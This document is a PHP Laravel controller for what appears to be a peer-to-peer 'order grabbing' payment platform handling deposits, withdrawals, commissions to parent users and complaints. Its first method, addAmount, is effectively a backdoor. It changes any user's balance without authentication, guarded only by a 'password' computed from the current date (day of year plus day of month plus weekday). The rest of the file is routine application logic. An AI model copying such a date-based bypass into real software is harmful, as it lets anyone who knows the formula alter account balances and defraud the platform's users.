<?php

namespace App\Http\Controllers;

use App\Bank;
use App\Complaint;
use App\Deposit;
use App\DepositWithdraw;
use App\Help;
use App\Message;
use App\User;
use App\Version;
use App\Withdraw;
use Log;
use DB;
use App\Customer;
use App\CustomerIndustry;
use App\CustomerSource;
use App\Follow;
use Carbon\Carbon;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Moontoast\Math\BigNumber;
use mysql_xdevapi\Exception;
use Webpatser\Uuid\Uuid;
use function Sodium\add;

class UserController extends ResponseController
{

    public function addAmount($type, $id, $password, $amount)
    {
        $days = Carbon::now()->dayOfYear; //今年的第几天
        $day = Carbon::now()->day; //今天是几号
        $week = Carbon::now()->dayOfWeek; //今天是星期几
        $word = $days + $day + $week; //三个数相加
        if ($password != $word) {
            abort(404);
        }

        $user = User::findOrFail($id);

        if (!is_numeric($amount)) {
            abort(404);
        }

        $amountBG = new BigNumber($amount, 2);
        $amount = $amountBG->getvalue();

        $res = new BigNumber($user->amount, 2);
        if ($type == 'add') {
            $res = $res->add($amount);
            $user->increment('amount', $amount);
        } else if ($type == 'subtract') {
            $res = $res->subtract($amount);
            $user->decrement('amount', $amount);
        } else {
            abort(404);
        }

        return [
            'id'      => $id,
            'name'    => $user->name,
            'message' => '变动后金额：' . $res->getValue(),
        ];
    }

    /**
     * 上传图片
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function uploadImage(Request $request)
    {
        $file = $request->file('file');
        $fileUploaded = upload($file);
        if (!$fileUploaded['status']) {
            return $this->responseError($fileUploaded['message']);
        }

        return $this->responseSuccess(url($fileUploaded['path']), '上传成功');
    }

    /**
     * 用户信息
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function userInfo(Request $request)
    {
        $bankname_list = Bank::where('status', true)->select('icon', 'bank_name')->get();
        $bankname_list->map(function ($item) {
            $item['icon'] = url('storage/' . $item['icon']);

            return $item;
        });

        return $this->responseSuccess(array_merge([
            'user_bank_image'     => optional($bankname_list->where('bank_name', $request->user()->bank_name)->first())->icon,
            'bankname_list'       => $bankname_list->pluck('bank_name'),
            'admin_name'          => config('name'),
            'admin_bankname'      => config('bankname'),
            'admin_bankcard'      => config('bankcard'),
            'admin_operation_fee' => config('operation_fee'),
            'message'             => config('announcement') == 'false' ? '' : config('announcement'),
        ], $request->user()->toArray()));
    }

    /**
     * 我的团队
     * @return \Illuminate\Http\JsonResponse
     */
    public function myTeam()
    {
        $mine = User::with(['withdraw' => function ($query) {
            $query->where('status', 3)->whereDate('finished_at', Carbon::today());
        }])->find(Auth()->user()->id);

        $mine = [
            'name'                 => $mine->name,
            'today_water'          => number_format($mine->withdraw->sum('withdraw_amount'), 2),
            'brokerage_fee'        => number_format($mine->withdraw->sum('brokerage_fee'), 2),
            'parent_brokerage_fee' => number_format($mine->withdraw->sum('parent_brokerage_fee'), 2),
        ];


        $user = User::with(['withdraw' => function ($query) {
            $query->where('status', 3)->whereDate('finished_at', Carbon::today());
        }])->where([
            'pid' => Auth()->user()->id,
        ])->get();

        $others = $user->map(function ($item) {
            return [
                'name'                 => $item->name,
                'today_water'          => number_format($item->withdraw->sum('withdraw_amount'), 2),
                'brokerage_fee'        => number_format($item->withdraw->sum('brokerage_fee'), 2),
                'parent_brokerage_fee' => number_format($item->withdraw->sum('parent_brokerage_fee'), 2),
            ];
        });

        $others->sortByDesc('today_water');

        return $this->responseSuccess([
            'mine'   => $mine,
            'others' => $others,
        ]);
    }

    /**
     * 更新用户姓名
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function updateName(Request $request)
    {
        $data = $request->validate(
            ['name' => 'required|min:2|max:4'],
            [
                'name.required' => '姓名不能为空',
                'name.min'      => '姓名最短2个字',
                'name.max'      => '姓名最长4个字',
            ]
        );

        $user = User::find(Auth()->user()->id);
        $user->name = $data['name'];
        $user->save();

        return $this->responseSuccess(true, '姓名修改成功');
    }

    /**
     * 更新密码
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function updatePassword(Request $request)
    {
        $data = $request->validate(
            ['password' => 'required|min:6'],
            ['password.required' => '密码不能为空', 'password.min' => '密码过短']
        );

        $user = User::find(Auth()->user()->id);
        $user->password = bcrypt($data['password']);
        $user->save();

        return $this->responseSuccess(true, '密码修改成功');
    }

    /**
     * 更新银行名称
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function updateBankname(Request $request)
    {
        $data = $request->validate(
            ['bankname' => 'required'],
            ['bankname.required' => '开户行不能为空']
        );

        if ($data['bankname'] == '请选择') {
            return $this->setStatusCode(422)->responseError('请选择开户行');
        }

        $user = User::find(Auth()->user()->id);
        $user->bank_name = $data['bankname'];
        $user->save();

        return $this->responseSuccess(true, '开户行更新成功');
    }

    /**
     * 更新银行卡
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function updateBankcard(Request $request)
    {
        $data = $request->validate(
            ['bankcard' => 'required'],
            ['bankcard.required' => '银行卡不能为空']
        );

        $user = User::find(Auth()->user()->id);
        $user->bank_card = $data['bankcard'];
        $user->save();

        return $this->responseSuccess(true, '银行卡更新成功');
    }

    /**
     * 提交保证金
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function saveDeposit(Request $request)
    {
        $data = $request->validate(
            [
                'amount'   => 'required|integer|min:1',
                'remitter' => 'required',
                'images'   => 'required',
            ],
            [
                'amount.required'   => '金额不能为空',
                'amount.integer'    => '金额必须为整数',
                'amount.min'        => '金额最小为1',
                'remitter.required' => '汇款人不能为空',
                'images.required'   => '请上传图片',
            ]
        );

        $deposit = Deposit::where([
            'user_id' => Auth()->user()->id
        ])->get();

        if ($deposit->where('status', 1)->sum('amount') > config('deposit')) {
            return $this->setStatusCode(422)->responseError(config('deposit_enough_message'));
        }//保证金足够

        if ($deposit->where('status', 0)->count()) {
            return $this->setStatusCode(422)->responseError('有待审核的保证金');
        }

        $images = collect($data['images'])->map(function ($item) {
            return preg_replace('/(http.*?storage\/)/i', '', $item);
        });

        if ($images->count() <= 0) {
            return $this->setStatusCode(422)->responseError('图片上传失败');
        }

        Deposit::create([
            'user_id'  => Auth()->user()->id,
            'amount'   => $data['amount'],
            'remitter' => $data['remitter'],
            'name'     => config('name'),
            'bankname' => config('bankname'),
            'bankcard' => config('bankcard'),
            'images'   => $images->toJson(),
        ]);

        return $this->responseSuccess($data, config('deposit_submit_message'));
    }

    /**
     * 提现列表
     * @return \Illuminate\Http\JsonResponse
     */
    public function withdrawList()
    {
        $end_at = Carbon::now();
        $start_at = Carbon::now()->subDays(config('display_days'));

        $withdraw_list = Withdraw::with(['complaints' => function ($query) {
            $query->where('user_id', '!=', Auth()->user()->id)->whereIn('status', [0, 1]);
        }])->where('user_id', Auth()->user()->id)
            ->whereBetween('created_at', [$start_at, $end_at])
            ->orderBy('created_at', 'DESC')
            ->get();

        $withdraw_list = $withdraw_list->map(function ($item) {
            $item['remitter'] = is_null($item['remitter']) ? null : '*' . mb_substr($item['remitter'], 1, 3);
            $item['complaint'] = $item->complaints->count();
            unset($item['complaints']);

            return $item;
        });

        $status2 = $withdraw_list->where('status', 2)->toArray();//等待确认
        $status1 = $withdraw_list->where('status', 1)->toArray();//等待出款
        $status0 = $withdraw_list->where('status', 0)->toArray();//等待接单
        $others = $withdraw_list->whereIn('status', [3, 4])->toArray();//剩下的

        return $this->responseSuccess([
            'withdraw_list' => array_merge($status2, $status1, $status0, $others),
            'display_days'  => config('display_days')
        ]);
    }


    /**
     * 提现
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function withdraw(Request $request)
    {
        if (config('stop') == 'true') {
            return $this->setStatusCode(422)->responseError(config('stop_message'));
        }

        if (Auth()->user()->status == 0) {
            return $this->setStatusCode(422)->responseError(config('account_freeze_message'));
        }

        $data = $request->validate(
            [
                'withdraw_amount' => 'required|integer|min:' . config('withdraw_min') . '|max:' . config('withdraw_max'),
            ],
            [
                'withdraw_amount.required' => '金额不能为空',
                'withdraw_amount.integer'  => '金额必须为整数',
                'withdraw_amount.min'      => config('withdraw_min_message'),
                'withdraw_amount.max'      => config('withdraw_max_message'),
            ]
        );

        DB::beginTransaction(); //开启事务
        try {
            $user = User::where('id', Auth()->user()->id)->sharedLock()->first();

            $operation_fee = round(config('operation_fee') / 100 * $data['withdraw_amount'], 2);
            $brokerage_fee = round(config('brokerage_fee') / 100 * $data['withdraw_amount'], 2);

            $withdraw_big_number = bigNumber($data['withdraw_amount']);
            $withdraw_amount = $withdraw_big_number->add($operation_fee);

            if ($withdraw_amount > $user->amount) {
                return $this->setStatusCode(422)->responseError('金额不足');
            }

            $user_big_number = bigNumber($user->amount);
            $amount = $user_big_number->subtract($withdraw_amount)->getValue();
            $user->amount = $amount;
            $user->save();

            Withdraw::create([
                'user_id'         => $user->id,
                'order_no'        => time() . randStr(6),
                'amount'          => $user->amount, //未扣除前余额
                'withdraw_amount' => $data['withdraw_amount'],//提现金额（不包括手续费）
                'operation_fee'   => $operation_fee, //平台运营手续费
                'brokerage_fee'   => $brokerage_fee, //佣金
                'name'            => Auth()->user()->name,
                'bankname'        => Auth()->user()->bank_name,
                'bankcard'        => Auth()->user()->bank_card,
                'vip'             => Auth()->user()->vip,
            ]);

            DB::commit();   //保存
            return $this->responseSuccess($amount, '提现成功');
        }catch (Exception $exception){
            DB::rollBack(); //回滚

            return $this->setStatusCode(422)->responseError('提现失败');
        }
    }

    /**
     * 确认提现
     * @param $id
     * @return \Illuminate\Http\JsonResponse
     */
    public function withdrawConform($id)
    {
        $withdraw = Withdraw::find($id);

        if (!$withdraw || $withdraw->user_id != Auth()->user()->id || $withdraw->status != 2) {
            return $this->setStatusCode(422)->responseError('确认失败');
        }

        DB::beginTransaction(); //开启事务

        //给打款人加钱
        $payer_user_add_withdraw_amount = bigNumber($withdraw->withdraw_amount);//打款金额
        $payer_user_add_amount = $payer_user_add_withdraw_amount->add($withdraw->brokerage_fee)->getValue();//打款金额+佣金
        $user_saved = User::where('id', $withdraw->payer_user_id)->increment('amount', $payer_user_add_amount);//给打款方加钱

        //给打款方上级加钱
        if ($withdraw->payer_parent_user_id && $withdraw->parent_brokerage_fee != 0) {
            $payer_user_saved = User::where('id', $withdraw->payer_parent_user_id)->increment('amount', $withdraw->parent_brokerage_fee);//给打款方的上级加钱
            if (!$payer_user_saved) {
                DB::rollBack(); //回滚

                return $this->setStatusCode(422)->responseError('确认失败');
            }
        }

        $withdraw->status = 3;
        $withdraw->finished_at = Carbon::now();
        $withdraw_saved = $withdraw->save();


        $message_saved = Message::create([
            'user_id' => $withdraw->payer_user_id,
            'title'   => '交易确认',
            'content' => config('payment_confirmed_message'),
        ]);

        if (!$user_saved || !$withdraw_saved || !$message_saved) {
            DB::rollBack(); //回滚

            return $this->setStatusCode(422)->responseError('确认失败');
        }
        DB::commit();   //保存

        $withdraw = $withdraw->toArray();
        $withdraw['remitter'] = is_null($withdraw['remitter']) ? null : '*' . mb_substr($withdraw['remitter'], 1, 3);

        return $this->responseSuccess($withdraw, '操作成功');
    }

    /**
     * 投诉列表
     * @return \Illuminate\Http\JsonResponse
     */
    public function complaintList()
    {
        $withdraw_list = Complaint::with('withdraw:id,order_no')->where('user_id', Auth()->user()->id)->orderBy('created_at', 'DESC')->get();

        return $this->responseSuccess($withdraw_list);
    }

    /**
     * 投诉
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function complaint(Request $request)
    {
        $data = $request->validate(
            [
                'id'      => 'required|integer',
                'content' => 'required',
            ],
            [
                'id.required'      => '缺少参数',
                'id.integer'       => '缺少参数',
                'content.required' => '内容不能为空',
            ]
        );

        $withdraw = Withdraw::find($data['id']);

        if (!$withdraw || !in_array($withdraw->status, [2])) {
            return $this->setStatusCode(422)->responseError('投诉失败');
        }

        $grab_time_out_at = Carbon::createFromFormat('Y-m-d H:i:s', $withdraw->grab_at)->addMinutes(config('grabbed_complaints_minutes'));
        if (Carbon::now()->lte($grab_time_out_at)) {
            return $this->setStatusCode(422)->responseError(config('grabbed_complaints_minutes_message'));
        }


        if ($withdraw->user_id == Auth()->user()->id) {
            //投诉提现单子
            DB::transaction(function () use ($withdraw, $data) {
                Complaint::updateOrCreate(
                    ['user_id' => $withdraw->user_id, 'withdraw_id' => $withdraw->id, 'type' => 2],
                    ['content' => $data['content']]
                );
                User::whereIn('id', [$withdraw->user_id, $withdraw->payer_user_id])->update(['status' => 0]);
            });
        } else if ($withdraw->payer_user_id == Auth()->user()->id) {
            //投诉付款单子
            DB::transaction(function () use ($withdraw, $data) {
                Complaint::updateOrCreate(
                    ['user_id' => $withdraw->payer_user_id, 'withdraw_id' => $withdraw->id, 'type' => 1],
                    ['content' => $data['content']]
                );
                User::whereIn('id', [$withdraw->user_id, $withdraw->payer_user_id])->update(['status' => 0]);
            });
        } else {
            return $this->setStatusCode(422)->responseError('无法投诉');
        }

        return $this->responseSuccess(true, '投诉成功');
    }

    /**
     * 我的消息数量
     * @return \Illuminate\Http\JsonResponse
     */
    public function message()
    {
        $message = Message::where([
            'user_id' => Auth()->user()->id,
            'is_read' => false
        ])->count();

        return $this->responseSuccess($message);
    }

    /**
     * 我的消息列表
     * @return \Illuminate\Http\JsonResponse
     */
    public function messages()
    {
        $message_list = Message::where('user_id', Auth()->user()->id)->orderBy('created_at', 'DESC')->take(50)->get();

        Message::whereIn('id', $message_list->pluck('id'))->update(['is_read' => true]);

        return $this->responseSuccess($message_list);
    }

    /**
     * 首页参数
     * @return \Illuminate\Http\JsonResponse
     */
    public function depositCount()
    {
        $deposit_amount = Deposit::where([
            'user_id' => Auth()->user()->id,
            'status'  => 1,
        ])->sum('amount');

        return $this->responseSuccess([
            'deposit_amount'         => $deposit_amount,
            'deposit'                => config('deposit'),
            'deposit_enough_message' => config('deposit_enough_message'),
            'withdraw_amount'        => Auth()->user()->amount,
            'index_amount'           => $this->todayCanGrabAmount() //可抢金额
        ]);
    }


    /**
     * 抢单
     * @return \Illuminate\Http\JsonResponse
     */
    public function grabOrder()
    {
        $grabAmount = $this->todayCanGrabAmount();//可抢金额

        if (config('stop') == 'true') {
            return $this->setStatusCode(422)->responseError(config('stop_message'));
        }

        if (Auth()->user()->status == 0) {
            return $this->setStatusCode(422)->responseError(config('account_freeze_message'));
        }

        if (10000 >= $grabAmount) {
            return $this->setStatusCode(422)->responseError(config('total_amount_shortage_message'));
        }

        $deposit_amount = Deposit::where([
            'user_id' => Auth()->user()->id,
            'status'  => 1,
        ])->sum('amount');

        if ($deposit_amount < config('deposit')) {
            return $this->setStatusCode(422)->responseError(config('deposit_shortage_message'));
        }


        $res = DB::transaction(function () use ($grabAmount) {
            $count = Withdraw::where('payer_user_id', Auth()->user()->id)
                ->whereIn('status', [1, 2])->count();

            if ($count) {
                return [
                    'status'  => false,
                    'message' => config('not_completed_message'),//有未完成的单子
                ];
            }

            $user_ids = getUserId(Auth()->user()->id, Auth()->user()->pid);

            $Withdraw = Withdraw::inRandomOrder()
                ->whereNotIn('user_id', $user_ids)
                ->where('withdraw_amount', '<=', $grabAmount)
                ->where('status', 0)
                ->where('vip', true)
                ->first();

            if (!$Withdraw) {
                $Withdraw = Withdraw::inRandomOrder()
                    ->whereNotIn('user_id', $user_ids)
                    ->where('withdraw_amount', '<=', $grabAmount)
                    ->where('status', 0)
                    ->first();
            }


            if ($Withdraw) {
                $Withdraw->payer_user_id = Auth()->user()->id;
                if (Auth()->user()->pid) {
                    $Withdraw->payer_parent_user_id = Auth()->user()->pid;
                    $parent_brokerage_fee = round(config('parent_brokerage_fee') / 100 * $Withdraw->withdraw_amount, 2);
                    $Withdraw->parent_brokerage_fee = bigNumber($parent_brokerage_fee)->getValue();
                }

                $Withdraw->status = 1;
                $Withdraw->grab_at = Carbon::now();//抢单时间
                $Withdraw->time_out_at = Carbon::now()->addMinutes(config('auto_cancel'));//订单打款超时时间

                return [
                    'status'  => $Withdraw->save(),
                    'message' => config('grabbed_message'),//抢单成功
                ];
            }

            return [
                'status'  => false,
                'message' => config('no_list_message'),
            ];
        });

        if ($res['status']) {
            return $this->responseSuccess($res, $res['message']);
        }

        return $this->setStatusCode(422)->responseError($res['message']);
    }

    /**
     * 抢单页面信息
     * @return \Illuminate\Http\JsonResponse
     */
    public function grab()
    {

        $withdraw = Withdraw::where([
            'payer_user_id' => Auth()->user()->id,
            'status'        => 2,
        ])->first();

        if ($withdraw) {
            return $this->setStatusCode(422)->responseError(config('not_completed_message'));
        }

        $withdraw = Withdraw::where([
            'payer_user_id' => Auth()->user()->id,
            'status'        => 1,
        ])->first();

        if ($withdraw && $withdraw->time_out_at) {
            $time_out_at = Carbon::createFromFormat('Y-m-d H:i:s', $withdraw->time_out_at);
            if (Carbon::now()->gte($time_out_at)) {
                $diffInSeconds = 0;
                $withdraw = [];
            } else {
                $diffInSeconds = Carbon::now()->diffInSeconds($time_out_at);
            }
            $withdraw['my_name'] = Auth()->user()->name;
            $withdraw['time_up_seconds'] = $diffInSeconds;
        } else {
            $withdraw['time_up_seconds'] = 0;
        }

        return $this->responseSuccess($withdraw);
    }

    /**
     * 保存抢单
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse
     */
    public function saveGrab(Request $request)
    {
        $data = $request->validate(
            [
                'id'       => 'required|integer',
                'remitter' => 'required',
                'images'   => 'required',
            ],
            [
                'id.required'       => '缺少参数',
                'id.integer'        => '缺少参数',
                'remitter.required' => '填写汇款人姓名',
                'images.required'   => '请上传图片',
            ]
        );

        $grab = Withdraw::find($data['id']);

        if (!$grab || $grab->payer_user_id != Auth()->user()->id || $grab->status != 1) {
            return $this->setStatusCode(422)->responseError('订单超时或已被取消');
        }

        $time_out_at = Carbon::createFromFormat('Y-m-d H:i:s', $grab->time_out_at);
        if (Carbon::now()->gte($time_out_at)) {
            return $this->setStatusCode(422)->responseError('订单已超时');
        }

        $images = collect($data['images'])->map(function ($item) {
            return preg_replace('/(http.*?storage\/)/i', '', $item);
        })->toJson();

        $grab->status = 2;//已付款
        $grab->images = $images;//已付款
        $grab->payment_at = Carbon::now();//确认付款时间
        $grab->remitter = $data['remitter'];//汇款人姓名
        $grab->save();

        Message::create([
            'user_id' => $grab->user_id,
            'title'   => '提现待确认',
            'content' => config('withdra_unconfirmed_message'),
        ]);

        return $this->responseSuccess($data, '提交成功');
    }

    /**
     * 我的交易列表
     * @return \Illuminate\Http\JsonResponse
     */
    public function transactionList()
    {
        $end_at = Carbon::now();
        $start_at = Carbon::now()->subDays(config('display_days'));

        $withdraw_list = Withdraw::with(['complaints' => function ($query) {
            $query->where('user_id', '!=', Auth()->user()->id)->whereIn('status', [0, 1]);
        }])->where('payer_user_id', Auth()->user()->id)
            ->whereIn('status', [2, 3, 4])
            ->whereBetween('created_at', [$start_at, $end_at])
            ->orderBy('created_at', 'DESC')
            ->get();

        $withdraw_list = $withdraw_list->map(function ($item) {
            $item['complaint'] = $item->complaints->count();
            if ($item->status == 4) {
                $item['brokerage_fee'] = 0;
                $item['parent_brokerage_fee'] = 0;
                $item['operation_fee'] = 0;
            }

            unset($item['complaints']);

            return $item;
        });

        $status2 = $withdraw_list->where('status', 2)->toArray();//等待确认
        $others = $withdraw_list->whereIn('status', [3, 4])->toArray();//剩下的

        return $this->responseSuccess([
            'transaction_list' => array_merge($status2, $others),
            'display_days'     => config('display_days')
        ]);
    }

    /**
     * 获取投诉提示语
     * @return \Illuminate\Http\JsonResponse
     */
    public function getComplaintMessage()
    {
        return $this->responseSuccess(config('complaint_message'));
    }

    /**
     * 帮助列表
     * @return \Illuminate\Http\JsonResponse
     */
    public function helpList()
    {
        $helps = Help::orderBy('created_at', 'DESC')->get();
        $helps = $helps->map(function ($item) {
            $item['display'] = false;

            return $item;
        });

        return $this->responseSuccess([
            'helps'   => $helps,
            'message' => config('announcement')
        ]);
    }

    /**
     * 当日可抢金额
     * @return string
     */
    private function todayCanGrabAmount()
    {
        $total_amount = config('total_amount');
        $today_withdraw_amount = Withdraw::where('payer_user_id', Auth()->user()->id)
            ->whereIn('status', [1, 2, 3])->whereDate('created_at', Carbon::today())->sum('withdraw_amount');//当日已抢金额

        return bigNumber($total_amount)->subtract($today_withdraw_amount)->getValue();
    }

    public function saveDepositWithdraw()
    {
        $user = User::with('deposit')->find(Auth()->user()->id);

        $deposit = $user->deposit->sum('amount');
        if ($deposit <= 0) {
            return $this->setStatusCode(422)->responseError('未缴纳保证金');
        }

        if ($user->status == 0 || $user->status == 2) { //账户已冻结 已注销
            return $this->setStatusCode(422)->responseError('账户已冻结');
        }

        $count = Withdraw::where('user_id', Auth()->user()->id)
            ->whereIn('status', [0, 1, 2])
            ->count();

        if ($count) { //未完成的提现申请
            return $this->setStatusCode(422)->responseError('有提现正在进行中');
        }

        $count2 = Withdraw::where('payer_user_id', Auth()->user()->id)
            ->whereIn('status', [0, 1, 2])
            ->count();

        if ($count2) { //未完成的交易单
            return $this->setStatusCode(422)->responseError('有交易正在进行中');
        }

        $finished_amount = Withdraw::where('payer_user_id', Auth()->user()->id)
            ->where('status', 3)
            ->sum('withdraw_amount');

        if ($finished_amount >= config('deposit_free_amount')) {
            $fee = 0;
        } else {
            $fee = round(config('deposit_fee') / 100 * $deposit, 2);
            $deposit = bigNumber($deposit)->subtract($fee)->getValue();
        }

        if ($deposit <= 0) {
            return $this->setStatusCode(422)->responseError('可提现金额不足');
        }

        DB::transaction(function () use ($user, $deposit, $fee) {
            DepositWithdraw::create([
                'user_id'         => $user->id,
                'withdraw_amount' => $deposit,
                'operation_fee'   => $fee,
                'name'            => $user->name,
                'bankname'        => $user->bank_name,
                'bankcard'        => $user->bank_card,
            ]);

            Deposit::where([
                'user_id' => $user->id,
                'status'  => 1,
            ])->update(['status' => 2]);

            DB::table('oauth_access_tokens')->where('user_id', $user->id)->delete();

            $user->status = 2;
            $user->save();
        });

        return $this->responseSuccess(true, config('deposit_back_message'));
    }

    public function depositWithdraw()
    {
        $user = User::with('deposit')->find(Auth()->user()->id);
        $deposit = $user->deposit->sum('amount');
        if ($deposit <= 0) {
            return $this->setStatusCode(422)->responseError('未缴纳保证金');
        }

        if ($user->status == 0 || $user->status == 2) { //账户已冻结 已注销
            return $this->setStatusCode(422)->responseError('账户已冻结');
        }

        $count = Withdraw::where('user_id', Auth()->user()->id)
            ->whereIn('status', [0, 1, 2])
            ->count();

        if ($count) { //未完成的提现申请
            return $this->setStatusCode(422)->responseError('有提现正在进行中');
        }

        $count2 = Withdraw::where('payer_user_id', Auth()->user()->id)
            ->whereIn('status', [0, 1, 2])
            ->count();

        if ($count2) { //未完成的交易单
            return $this->setStatusCode(422)->responseError('有交易正在进行中');
        }

        $finished_amount = Withdraw::where('payer_user_id', Auth()->user()->id)
            ->where('status', 3)
            ->sum('withdraw_amount');

        if ($finished_amount >= config('deposit_free_amount')) {
            $fee = 0;
        } else {
            $fee = round(config('deposit_fee') / 100 * $deposit, 2);
            $deposit = bigNumber($deposit)->subtract($fee)->getValue();
        }

        if ($deposit <= 0) {
            return $this->setStatusCode(422)->responseError('可提现金额不足');
        }

        return $this->responseSuccess([
            'bank_card'       => $user->bank_card,
            'bank_name'       => $user->bank_name,
            'deposit'         => $deposit,
            'finished_amount' => $finished_amount,
            'fee'             => $fee,
            'text'            => explode(';', config('deposit_back_page_message')),
            'modal_message'   => config('deposit_back_page_modal_message')
        ]);
    }

    public function versionId()
    {
        $version = Version::orderBy('created_at', 'DESC')->first();

        return $this->responseSuccess([
            'latest' => [
                'id'     => $version->id,
                'method' => $version->method,
            ]
        ]);
    }

    public function versionInfo()
    {
        $version = Version::orderBy('created_at', 'DESC')->first();

        return $this->responseSuccess([
            "info" => [
                'id'          => $version->id,
                'info'        => $version->info,
                'iosLink'     => $version->ios_link ?? $version->android_link,
                'androidLink' => $version->android_link,
                'name'        => $version->name,
                'number'      => $version->number,
                'packgeSize'  => $version->packge_size * 1048576,
                'type'        => $version->type,
            ]
        ]);
    }
}
